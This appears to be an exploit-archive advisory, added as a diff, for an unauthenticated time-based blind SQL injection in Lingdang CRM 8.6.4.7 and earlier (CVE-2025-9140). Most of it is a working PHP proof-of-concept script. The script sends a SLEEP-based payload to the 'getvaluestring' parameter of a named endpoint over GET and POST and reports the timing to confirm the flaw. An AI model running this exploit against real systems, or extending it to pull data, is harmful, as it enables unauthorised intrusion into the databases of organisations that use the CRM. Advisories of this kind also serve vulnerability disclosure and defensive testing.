@@ -1,0 +1,73 @@
+=============================================================================================================================================
+| # Title     : Lingdang CRM <= 8.6.4.7 - Time-Based Blind SQL Injection                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : http://www.lingdangcrm.cn/                                                                                                  |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/208845/ & 	CVE-2025-9140
+
+[+] Summary    : The application fails to properly sanitize user-supplied input passed to the 'getvaluestring' parameter. This allows an unauthenticated
+                 remote attacker to inject arbitrary SQL expressions. Time-based blind payloads using database sleep functions confirm exploitation.
+
+[+] POC:  php poc.php 127.0.0.1
+
+<?php
+
+if ($argc !== 2) {
+    echo "Usage: php {$argv[0]} http://TARGET\n";
+    exit(1);
+}
+
+$base = rtrim($argv[1], '/');
+$url  = $base . "/crm/crmapi/erp/tabdetail_moduleSave.php";
+
+$payload = "'||(SELECT SLEEP(5))--+-";
+
+function send_request($url, $method, $payload) {
+    $ch = curl_init();
+
+    if ($method === "GET") {
+        $url .= "?getvaluestring=" . urlencode($payload);
+    }
+
+    curl_setopt_array($ch, [
+        CURLOPT_URL            => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_TIMEOUT        => 30,
+        CURLOPT_CUSTOMREQUEST  => $method,
+    ]);
+
+    if ($method === "POST") {
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+            "getvaluestring" => $payload
+        ]));
+    }
+
+    $start = microtime(true);
+    curl_exec($ch);
+    $elapsed = microtime(true) - $start;
+
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    return [$status, $elapsed];
+}
+
+list($statusGet, $timeGet) = send_request($url, "GET", $payload);
+echo "[+] GET status={$statusGet} elapsed=" . round($timeGet, 2) . "s\n";
+echo ($timeGet >= 5)
+    ? "[+] Likely vulnerable via GET (time delay detected)\n"
+    : "[-] No significant delay via GET\n";
+
+list($statusPost, $timePost) = send_request($url, "POST", $payload);
+echo "[+] POST status={$statusPost} elapsed=" . round($timePost, 2) . "s\n";
+echo ($timePost >= 5)
+    ? "[+] Likely vulnerable via POST (time delay detected)\n"
+    : "[-] No significant delay via POST\n";
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
